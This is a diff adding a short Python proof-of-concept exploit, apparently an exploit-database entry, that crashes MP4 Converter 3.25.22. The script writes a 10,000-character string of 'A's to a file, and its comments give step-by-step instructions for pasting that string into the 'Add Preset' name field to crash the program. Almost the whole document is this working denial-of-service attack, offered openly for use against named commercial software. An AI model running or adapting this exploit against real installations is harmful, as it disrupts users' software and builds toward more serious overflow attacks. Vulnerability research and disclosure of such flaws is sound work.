@@ -1,0 +1,22 @@
+# -*- coding: utf-8 -*-
+# Exploit Title: MP4 Converter 3.25.22 - 'Name' Denial of Service (PoC)
+# Date: 14/05/2019
+# Author: Alejandra Sánchez
+# Vendor Homepage: http://www.tomabo.com/
+# Software: http://www.tomabo.com/downloads/mp4-converter-setup.exe
+# Version: 3.25.22
+# Tested on: Windows 10
+
+# Proof of Concept:
+# 1.- Run the python script "MP4Converter.py", it will create a new file "MP4Converter.txt"
+# 2.- Copy the text from the generated MP4Converter.txt file to clipboard
+# 3.- Open MP4 Converter
+# 4.- Select 'Options' > 'Video/Audio Formats'
+# 5.- Click 'Add Preset' and paste clipboard in the field 'Name'
+# 6.- Click 'OK' and click 'Reset All' 
+# 7.- Crashed
+
+buffer = "\x41" * 10000
+f = open ("MP4Converter.txt", "w")
+f.write(buffer)
+f.close()
